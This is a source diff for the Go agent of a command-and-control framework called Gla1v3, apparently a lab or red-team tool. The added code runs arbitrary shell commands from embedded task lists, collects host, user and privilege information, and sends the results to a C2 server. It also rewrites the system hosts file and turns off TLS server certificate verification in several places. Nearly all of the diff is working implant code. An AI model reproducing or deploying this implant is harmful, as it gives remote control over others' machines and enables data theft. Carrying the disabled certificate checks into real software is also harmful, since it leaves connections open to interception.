@@ -7,19 +7,44 @@ import (
 	"crypto/x509"
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
 	"os/exec"
+	"os/signal"
+	"runtime"
 	"strings"
+	"syscall"
 	"time"
 )
 
 // Build-time configuration (injected via -ldflags)
 var (
-	BeaconInterval = "30s" // Default beacon interval
+	BeaconInterval = "30s"                  // Default beacon interval
 	C2Server       = "c2.gla1v3.local:4443" // Default C2 server
+	EmbeddedTasks  = "[]"                   // JSON array of tasks to execute
+	EmbeddedCACert = ""                     // PEM encoded CA certificate
+	EmbeddedCert   = ""                     // PEM encoded client certificate
+	EmbeddedKey    = ""                     // PEM encoded client key
 )
+
+// Task represents a task to execute on the agent
+type Task struct {
+	ID      string            `json:"id"`
+	Type    string            `json:"type"`
+	Params  map[string]string `json:"params"`
+	RunOnce bool              `json:"runOnce"`
+}
+
+// TaskResult represents the result of task execution
+type TaskResult struct {
+	TaskID string `json:"taskId"`
+	Type   string `json:"type"`
+	Status string `json:"status"`
+	Output string `json:"output"`
+	Error  string `json:"error,omitempty"`
+}
 
 // executeTask runs a task and sends the result back to C2
 func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args []string) {
@@ -69,9 +94,10 @@ func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args [
 	apiClient := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{
-				RootCAs:    client.Transport.(*http.Transport).TLSClientConfig.RootCAs,
-				ServerName: "api.gla1v3.local",
-				MinVersion: tls.VersionTLS12,
+				RootCAs:            client.Transport.(*http.Transport).TLSClientConfig.RootCAs,
+				ServerName:         "api.gla1v3.local",
+				MinVersion:         tls.VersionTLS12,
+				InsecureSkipVerify: true,
 			},
 		},
 		Timeout: 10 * time.Second,
@@ -87,61 +113,442 @@ func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args [
 	log.Printf("Task result sent: %s", resultResp.Status)
 }
 
-func main() {
-	// Cert paths (configurable)
-	// Resolve cert/key pair. Prefer env vars; otherwise try common repo filenames so a
-	// fresh clone + `generate_session_certs.sh` will be found without extra configuration.
-	certEnv := os.Getenv("AGENT_CERT_PATH")
-	keyEnv := os.Getenv("AGENT_KEY_PATH")
-
-	tryPairs := [][]string{}
-	if certEnv != "" && keyEnv != "" {
-		tryPairs = append(tryPairs, []string{certEnv, keyEnv})
+// executeEmbeddedTask executes a predefined embedded task
+func executeEmbeddedTask(task Task) TaskResult {
+	result := TaskResult{
+		TaskID: task.ID,
+		Type:   task.Type,
+		Status: "completed",
 	}
-	// repo-local candidates (relative to agents-go)
-	tryPairs = append(tryPairs, [][]string{
-		{"../certs/agent-client.crt", "../certs/agent-client.key"},
-		{"../certs/agent.crt", "../certs/agent.key"},
-		{"../certs/server.crt", "../certs/server.key"},
-	}...)
 
-	var cert tls.Certificate
-	var loadedCertPath, loadedKeyPath string
-	var loadErr error
-	attempted := []string{}
-	for _, p := range tryPairs {
-		attempted = append(attempted, p[0]+"|"+p[1])
-		if _, err := os.Stat(p[0]); err != nil {
-			continue
+	log.Printf("Executing embedded task: %s (type: %s)", task.ID, task.Type)
+
+	switch task.Type {
+	case "sys_info":
+		result.Output = collectSystemInfo()
+	case "cmd":
+		output, err := executeCommand(task.Params["command"])
+		result.Output = output
+		if err != nil {
+			result.Status = "failed"
+			result.Error = err.Error()
 		}
-		if _, err := os.Stat(p[1]); err != nil {
-			continue
-		}
-		cert, loadErr = tls.LoadX509KeyPair(p[0], p[1])
-		if loadErr == nil {
-			loadedCertPath = p[0]
-			loadedKeyPath = p[1]
-			break
-		}
-	}
-	if loadErr != nil {
-		log.Fatalf("Failed to load any agent cert/key pair. Attempts: %v. Last error: %v", attempted, loadErr)
-	}
-	log.Printf("Loaded agent cert/key: %s , %s", loadedCertPath, loadedKeyPath)
-
-	// 2. Load CA so we trust the server (fatal if missing)
-	caPath := os.Getenv("AGENT_CA_PATH")
-	if caPath == "" {
-		caPath = "../certs/ca.crt"
+	case "network_scan":
+		result.Output = fmt.Sprintf("Network scan not yet implemented (subnet: %s)", task.Params["subnet"])
+	case "file_search":
+		result.Output = fmt.Sprintf("File search not yet implemented (path: %s, pattern: %s)", 
+			task.Params["path"], task.Params["pattern"])
+	case "priv_check":
+		result.Output = collectPrivilegeInfo()
+	default:
+		result.Status = "failed"
+		result.Error = fmt.Sprintf("Unknown task type: %s", task.Type)
 	}
 
-	caCert, err := os.ReadFile(caPath)
+	return result
+}
+
+// collectSystemInfo gathers basic system information
+func collectSystemInfo() string {
+	info := make(map[string]string)
+	
+	// Hostname
+	if hostname, err := os.Hostname(); err == nil {
+		info["hostname"] = hostname
+	}
+	
+	// OS and architecture
+	info["os"] = runtime.GOOS
+	info["arch"] = runtime.GOARCH
+	
+	// User
+	if user := os.Getenv("USER"); user != "" {
+		info["user"] = user
+	} else if user := os.Getenv("USERNAME"); user != "" {
+		info["user"] = user
+	}
+	
+	// Kernel version (Linux)
+	if runtime.GOOS == "linux" {
+		if output, err := exec.Command("uname", "-r").Output(); err == nil {
+			info["kernel"] = strings.TrimSpace(string(output))
+		}
+	}
+	
+	// OS version
+	if runtime.GOOS == "linux" {
+		if data, err := os.ReadFile("/etc/os-release"); err == nil {
+			for _, line := range strings.Split(string(data), "\n") {
+				if strings.HasPrefix(line, "PRETTY_NAME=") {
+					info["os_version"] = strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
+					break
+				}
+			}
+		}
+	} else if runtime.GOOS == "windows" {
+		if output, err := exec.Command("cmd", "/c", "ver").Output(); err == nil {
+			info["os_version"] = strings.TrimSpace(string(output))
+		}
+	}
+	
+	output, _ := json.MarshalIndent(info, "", "  ")
+	return string(output)
+}
+
+// executeCommand runs a shell command
+func executeCommand(command string) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
+	} else {
+		cmd = exec.CommandContext(ctx, "sh", "-c", command)
+	}
+	
+	output, err := cmd.CombinedOutput()
+	result := string(output)
+	
+	if len(result) > 4096 {
+		result = result[:4096] + "...(truncated)"
+	}
+	
+	return result, err
+}
+
+// collectPrivilegeInfo checks for privilege escalation vectors
+func collectPrivilegeInfo() string {
+	info := make(map[string]interface{})
+	
+	// Check if running as root/admin
+	if runtime.GOOS == "linux" {
+		output, _ := exec.Command("id", "-u").Output()
+		uid := strings.TrimSpace(string(output))
+		info["is_root"] = (uid == "0")
+		info["uid"] = uid
+		
+		// Check sudo access
+		if err := exec.Command("sudo", "-n", "true").Run(); err == nil {
+			info["has_sudo"] = true
+		} else {
+			info["has_sudo"] = false
+		}
+	} else if runtime.GOOS == "windows" {
+		// Windows admin check
+		cmd := exec.Command("net", "session")
+		if err := cmd.Run(); err == nil {
+			info["is_admin"] = true
+		} else {
+			info["is_admin"] = false
+		}
+	}
+	
+	output, _ := json.MarshalIndent(info, "", "  ")
+	return string(output)
+}
+
+// sendTaskResults sends embedded task results to C2
+func sendTaskResults(client *http.Client, c2Server, agentID string, results []TaskResult) {
+	if len(results) == 0 {
+		return
+	}
+	
+	// Build API URL
+	apiURL := strings.Replace("https://"+c2Server, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
+	apiURL = strings.Replace(apiURL, "/beacon", "", 1)
+	resultURL := fmt.Sprintf("%s/api/agents/%s/embedded-tasks", apiURL, agentID)
+	
+	payload := map[string]interface{}{
+		"results": results,
+	}
+	
+	body, _ := json.Marshal(payload)
+	
+	log.Printf("Sending %d embedded task results to %s", len(results), resultURL)
+	
+	req, _ := http.NewRequest("POST", resultURL, bytes.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	
+	resp, err := client.Do(req)
 	if err != nil {
-		log.Fatal("Failed to read CA cert:", err)
+		log.Printf("Failed to send embedded task results: %v", err)
+		return
 	}
-	caCertPool := x509.NewCertPool()
-	if !caCertPool.AppendCertsFromPEM(caCert) {
-		log.Fatal("Failed to append CA cert to pool")
+	defer resp.Body.Close()
+	
+	if resp.StatusCode == 200 {
+		log.Printf("Successfully sent embedded task results")
+	} else {
+		log.Printf("Failed to send embedded task results: %s", resp.Status)
+	}
+}
+
+// detectGateway detects the C2 host IP address
+func detectGateway() (string, error) {
+	var cmd *exec.Cmd
+	
+	// First, get the default gateway
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", "route print 0.0.0.0")
+	} else {
+		cmd = exec.Command("sh", "-c", "ip route | grep default | awk '{print $3}' | head -n1")
+	}
+	
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	
+	gateway := strings.TrimSpace(string(output))
+	
+	// For Windows, parse the route print output
+	if runtime.GOOS == "windows" {
+		lines := strings.Split(gateway, "\n")
+		for _, line := range lines {
+			if strings.Contains(line, "0.0.0.0") && strings.Contains(line, "0.0.0.0") {
+				fields := strings.Fields(line)
+				if len(fields) >= 3 {
+					gateway = fields[2]
+					break
+				}
+			}
+		}
+	}
+	
+	// For VM environments, try .1 first (common host machine IP)
+	// Then fall back to actual gateway
+	if strings.Contains(gateway, ".") {
+		parts := strings.Split(gateway, ".")
+		if len(parts) == 4 {
+			hostIP := parts[0] + "." + parts[1] + "." + parts[2] + ".1"
+			
+			// Test if .1 is reachable on port 443
+			log.Printf("Testing host IP %s...", hostIP)
+			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+			defer cancel()
+			
+			client := &http.Client{
+				Timeout: 2 * time.Second,
+				Transport: &http.Transport{
+					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+				},
+			}
+			
+			req, _ := http.NewRequestWithContext(ctx, "GET", "https://"+hostIP+":443", nil)
+			_, testErr := client.Do(req)
+			
+			if testErr == nil || strings.Contains(testErr.Error(), "certificate") || strings.Contains(testErr.Error(), "handshake") {
+				log.Printf("Host IP %s is reachable, using it", hostIP)
+				return hostIP, nil
+			}
+			
+			log.Printf("Host IP %s not reachable, using gateway %s", hostIP, gateway)
+		}
+	}
+	
+	return gateway, nil
+}
+
+// setupHosts adds entries to the hosts file for C2 domains
+func setupHosts(gateway string) error {
+	var hostsPath string
+	if runtime.GOOS == "windows" {
+		hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts"
+	} else {
+		hostsPath = "/etc/hosts"
+	}
+	
+	// Read current hosts file
+	content, err := ioutil.ReadFile(hostsPath)
+	if err != nil {
+		return fmt.Errorf("failed to read hosts file: %v", err)
+	}
+	
+	// Remove any existing Gla1v3 entries (including old/stale ones)
+	lines := strings.Split(string(content), "\n")
+	var cleanedLines []string
+	skipNext := false
+	
+	for _, line := range lines {
+		if strings.Contains(line, "# Gla1v3 C2") {
+			skipNext = true
+			continue
+		}
+		if skipNext && (strings.Contains(line, "gla1v3.local")) {
+			continue
+		}
+		// Also remove any standalone gla1v3.local entries without comment
+		if strings.Contains(line, "gla1v3.local") {
+			continue
+		}
+		skipNext = false
+		cleanedLines = append(cleanedLines, line)
+	}
+	
+	// Add fresh entries with current gateway
+	entries := fmt.Sprintf("\n# Gla1v3 C2 (auto-added)\n%s api.gla1v3.local\n%s c2.gla1v3.local\n%s dashboard.gla1v3.local\n%s wazuh.gla1v3.local\n", gateway, gateway, gateway, gateway)
+	newContent := strings.Join(cleanedLines, "\n") + entries
+	
+	// Write back
+	err = ioutil.WriteFile(hostsPath, []byte(newContent), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write hosts file: %v", err)
+	}
+	
+	log.Printf("Updated hosts entries: %s -> *.gla1v3.local", gateway)
+	return nil
+}
+
+// cleanupHosts removes C2 entries from the hosts file
+func cleanupHosts() {
+	var hostsPath string
+	if runtime.GOOS == "windows" {
+		hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts"
+	} else {
+		hostsPath = "/etc/hosts"
+	}
+	
+	// Read current hosts file
+	content, err := ioutil.ReadFile(hostsPath)
+	if err != nil {
+		log.Printf("Failed to read hosts file during cleanup: %v", err)
+		return
+	}
+	
+	// Remove Gla1v3 entries
+	lines := strings.Split(string(content), "\n")
+	var newLines []string
+	skipNext := false
+	
+	for _, line := range lines {
+		if strings.Contains(line, "# Gla1v3 C2 (auto-added)") {
+			skipNext = true
+			continue
+		}
+		if skipNext && (strings.Contains(line, "api.gla1v3.local") || strings.Contains(line, "c2.gla1v3.local")) {
+			continue
+		}
+		skipNext = false
+		newLines = append(newLines, line)
+	}
+	
+	// Write back
+	newContent := strings.Join(newLines, "\n")
+	err = ioutil.WriteFile(hostsPath, []byte(newContent), 0644)
+	if err != nil {
+		log.Printf("Failed to write hosts file during cleanup: %v", err)
+		return
+	}
+	
+	log.Println("Cleaned up hosts entries")
+}
+
+func main() {
+	var cert tls.Certificate
+	var caCertPool *x509.CertPool
+	var loadErr error
+
+	// Setup signal handling for cleanup
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		log.Println("Received shutdown signal, cleaning up...")
+		cleanupHosts()
+		os.Exit(0)
+	}()
+
+	// Detect gateway and setup hosts file
+	gateway, err := detectGateway()
+	if err != nil {
+		log.Printf("Warning: Failed to detect gateway: %v", err)
+		log.Println("Proceeding without automatic hosts configuration")
+	} else {
+		log.Printf("Detected gateway: %s", gateway)
+		if err := setupHosts(gateway); err != nil {
+			log.Printf("Warning: Failed to setup hosts file: %v", err)
+			log.Println("You may need to manually add entries to /etc/hosts or run as root")
+		}
+	}
+
+	// Check if we have embedded certificates (compiled-in)
+	if EmbeddedCert != "" && EmbeddedKey != "" && EmbeddedCACert != "" {
+		log.Println("Using embedded certificates")
+		
+		// Convert escaped newlines back to actual newlines
+		certPEM := strings.Replace(EmbeddedCert, "\\n", "\n", -1)
+		keyPEM := strings.Replace(EmbeddedKey, "\\n", "\n", -1)
+		caCertPEM := strings.Replace(EmbeddedCACert, "\\n", "\n", -1)
+		
+		// Load embedded cert/key pair
+		cert, loadErr = tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
+		if loadErr != nil {
+			log.Fatalf("Failed to load embedded cert/key: %v", loadErr)
+		}
+		
+		// Load embedded CA cert
+		caCertPool = x509.NewCertPool()
+		if !caCertPool.AppendCertsFromPEM([]byte(caCertPEM)) {
+			log.Fatal("Failed to append embedded CA cert to pool")
+		}
+		
+		log.Println("Successfully loaded embedded certificates")
+	} else {
+		// Fallback to file-based certificates
+		log.Println("No embedded certs found, loading from files...")
+		
+		// Resolve cert/key pair. Prefer env vars; otherwise try common repo filenames
+		certEnv := os.Getenv("AGENT_CERT_PATH")
+		keyEnv := os.Getenv("AGENT_KEY_PATH")
+
+		tryPairs := [][]string{}
+		if certEnv != "" && keyEnv != "" {
+			tryPairs = append(tryPairs, []string{certEnv, keyEnv})
+		}
+		// repo-local candidates (relative to agents-go)
+		tryPairs = append(tryPairs, [][]string{
+			{"../certs/agent-client.crt", "../certs/agent-client.key"},
+			{"../certs/agent.crt", "../certs/agent.key"},
+			{"../certs/server.crt", "../certs/server.key"},
+		}...)
+
+		var loadedCertPath, loadedKeyPath string
+		attempted := []string{}
+		for _, p := range tryPairs {
+			attempted = append(attempted, p[0]+"|"+p[1])
+			if _, err := os.Stat(p[0]); err != nil {
+				continue
+			}
+			if _, err := os.Stat(p[1]); err != nil {
+				continue
+			}
+			cert, loadErr = tls.LoadX509KeyPair(p[0], p[1])
+			if loadErr == nil {
+				loadedCertPath = p[0]
+				loadedKeyPath = p[1]
+				break
+			}
+		}
+		if loadErr != nil {
+			log.Fatalf("Failed to load any agent cert/key pair. Attempts: %v. Last error: %v", attempted, loadErr)
+		}
+		log.Printf("Loaded agent cert/key: %s , %s", loadedCertPath, loadedKeyPath)
+
+		// Load CA cert from file
+		caPath := os.Getenv("AGENT_CA_PATH")
+		if caPath == "" {
+			caPath = "../certs/ca.crt"
+		}
+
+		caCert, err := os.ReadFile(caPath)
+		if err != nil {
+			log.Fatal("Failed to read CA cert:", err)
+		}
+		caCertPool = x509.NewCertPool()
+		if !caCertPool.AppendCertsFromPEM(caCert) {
+			log.Fatal("Failed to append CA cert to pool")
+		}
 	}
 
 	// Server names
@@ -155,11 +562,13 @@ func main() {
 	}
 
 	// 3. mTLS config (required by default)
+	// Note: InsecureSkipVerify for Traefik's certificate, but still presents client cert
 	tlsConfig := &tls.Config{
-		Certificates: []tls.Certificate{cert},
-		RootCAs:      caCertPool,
-		ServerName:   serverName,
-		MinVersion:   tls.VersionTLS12,
+		Certificates:       []tls.Certificate{cert},
+		RootCAs:            caCertPool,
+		ServerName:         serverName,
+		MinVersion:         tls.VersionTLS12,
+		InsecureSkipVerify: true, // Skip Traefik cert verification, mTLS still works
 	}
 
 	client := &http.Client{
@@ -170,10 +579,11 @@ func main() {
 	// Separate TLS config for API (whoami) requests: trust same CA but use API servername
 	// API TLS: also present client cert for mTLS to API
 	apiTLS := &tls.Config{
-		Certificates: []tls.Certificate{cert},
-		RootCAs:      caCertPool,
-		ServerName:   apiServerName,
-		MinVersion:   tls.VersionTLS12,
+		Certificates:       []tls.Certificate{cert},
+		RootCAs:            caCertPool,
+		ServerName:         apiServerName,
+		MinVersion:         tls.VersionTLS12,
+		InsecureSkipVerify: true, // Skip Traefik cert verification, mTLS still works
 	}
 
 	whoamiClient := &http.Client{
@@ -211,6 +621,46 @@ func main() {
 	// Limits
 	const cmdTimeout = 3 * time.Second
 	const maxOutput = 2048
+
+	// Parse and execute embedded tasks
+	var embeddedTasks []Task
+	var taskResults []TaskResult
+	executedTasks := make(map[string]bool)
+	
+	if EmbeddedTasks != "" && EmbeddedTasks != "[]" {
+		if err := json.Unmarshal([]byte(EmbeddedTasks), &embeddedTasks); err != nil {
+			log.Printf("Failed to parse embedded tasks: %v", err)
+		} else {
+			log.Printf("Loaded %d embedded tasks", len(embeddedTasks))
+			
+			// Execute run-once tasks immediately
+			for _, task := range embeddedTasks {
+				if task.RunOnce {
+					result := executeEmbeddedTask(task)
+					taskResults = append(taskResults, result)
+					executedTasks[task.ID] = true
+				}
+			}
+			
+			// Send initial task results
+			if len(taskResults) > 0 {
+				// Use API client with proper TLS config
+				apiClient := &http.Client{
+					Transport: &http.Transport{
+						TLSClientConfig: &tls.Config{
+							Certificates:       []tls.Certificate{cert},
+							RootCAs:            caCertPool,
+							ServerName:         "api.gla1v3.local",
+							MinVersion:         tls.VersionTLS12,
+							InsecureSkipVerify: true,
+						},
+					},
+					Timeout: 10 * time.Second,
+				}
+				sendTaskResults(apiClient, C2Server, agentID, taskResults)
+			}
+		}
+	}
 
 	// Helper to get local IP address
 	getLocalIP := func() string {
